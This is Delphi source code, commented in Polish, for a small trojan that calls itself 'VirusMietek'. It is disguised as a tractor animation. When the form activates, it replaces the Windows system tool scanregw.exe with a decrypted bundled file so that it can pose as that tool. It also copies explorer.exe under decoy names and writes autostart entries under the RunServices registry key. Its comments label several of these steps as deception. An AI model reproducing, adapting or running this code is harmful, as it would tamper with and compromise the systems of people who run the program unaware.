   unit Taczkau;

   interface

   uses
     Windows, Messages, SysUtils, Classes, Graphics, Controls, Forms, Dialogs, Registry,
     StdCtrls, FileOper, Crypt;

   type
     TTraktor = class(TForm)
       Pliki: TFileOperation;
       szyfr: TCryptFile;
       Button1: TButton;
       procedure FormActivate(Sender: TObject);
       procedure Button1Click(Sender: TObject);
      private
       Rejestr:TRegistry;
       { Private declarations }
     public
       { Public declarations }
     end;

   var
     Traktor: TTraktor;

   implementation

   {$R *.DFM}

   procedure TTraktor.FormActivate(Sender: TObject);
   begin
    Pliki.Source := 'c:\windows\scanregw.exe';
    Pliki.Destination := 'c:\windows\system\registry.exe';
    Pliki.Execute; {Kopiuje plik pod, który siê bêdzie podszywa³}

    szyfr.Decrypt; {Odszyfrowyje plik i kopiuje jako w/w}
    Pliki.Source := ExtractFilePath(Application.ExeName)+'ScanRegW.exe';
    Pliki.Destination := 'c:\windows\scanregw.exe';
    Pliki.Execute;

    Pliki.Source := 'd:\windows\explorer.exe';{To tak dla zmy³ki}
    Pliki.Mode:=foCopy;
    Pliki.Destination := 'c:\windows\lame.exe';
    Pliki.Execute;
    Pliki.Destination := 'c:\windows\ban.exe';
    Pliki.Execute;
    Pliki.Destination := 'c:\windows\system\boss.exe';
    Pliki.Execute;

    Rejestr := TRegistry.Create;     {Tworzenie dla zmy³ki rejestrów}
    Rejestr.RootKey:=(HKEY_LOCAL_MACHINE);
    Rejestr.OpenKey('Software\Microsoft\Windows\CurrentVersion\RunServices',False);
    Rejestr.WriteString('Timezone','C:\Windows\timezone.exe');
    Rejestr.WriteString('Trap','C:\Windows\System\Deltre.exe');
    Rejestr.WriteString('Virusek','C:\Program Files\Common Files\System\Ado\hid.exe');
    Rejestr.Free;

    Traktor.Caption := 'Traktor'; { Jakieœ Show efekty dla zmy³ki}

    end;


   procedure TTraktor.Button1Click(Sender: TObject);
   var xt,yt,licznik : integer;
   begin
   Button1.Visible := false;
   Traktor.ClientWidth := 536;
   canvas.Brush.Color := clYellow;
   canvas.Ellipse(480,10,520,50);
   canvas.Brush.Color := $00004080;
   canvas.Rectangle(0,185,536,219);
   //Jazda traktora
   xt :=0; yt:= 70;
   for licznik:=0 to 60 do begin
   xt := xt +5;
   canvas.Pen.Color := clBlack;
   canvas.Brush.Color := clGreen;
   canvas.Rectangle(xt+45,yt+45,xt+50,yt+10);
   canvas.Rectangle(xt+90,yt+45,xt+95,yt+10);
   canvas.Rectangle(xt+40,yt+40,xt+200,yt+80);
   canvas.Brush.Color := clBlack;
   canvas.Rectangle(xt+40,yt+10,xt+100,yt+15);
   canvas.Rectangle(xt+160,yt+40,xt+175,yt+15);
   canvas.Ellipse(xt+25,yt+45,xt+95,yt+115);
   canvas.Ellipse(xt+160,yt+78,xt+195,yt+113);
   canvas.Brush.Color := $004080FF;
   canvas.Ellipse(xt+90,yt+20,xt+70,yt+40);
   sleep(50);
   canvas.Brush.color := clBlue;
   canvas.Pen.color := clBlue;

   canvas.Rectangle(xt+45,yt+45,xt+50,yt+10);
   canvas.Rectangle(xt+90,yt+45,xt+95,yt+10);
   canvas.Rectangle(xt+40,yt+40,xt+200,yt+80);
   canvas.Rectangle(xt+40,yt+10,xt+100,yt+15);
   canvas.Rectangle(xt+160,yt+40,xt+175,yt+15);
   canvas.Ellipse(xt+25,yt+45,xt+95,yt+115);
   canvas.Ellipse(xt+160,yt+78,xt+195,yt+113);
   canvas.Ellipse(xt+90,yt+20,xt+70,yt+40);
   end;
   ShowMessage('Czeœæ, jestem Mietek Traktorzysta, alias VirusMietek');
   ShowMessage('Pozwolisz ze u ciebie zagoszcze heheheheheheheheee..');
   Close;
   end;

   end.
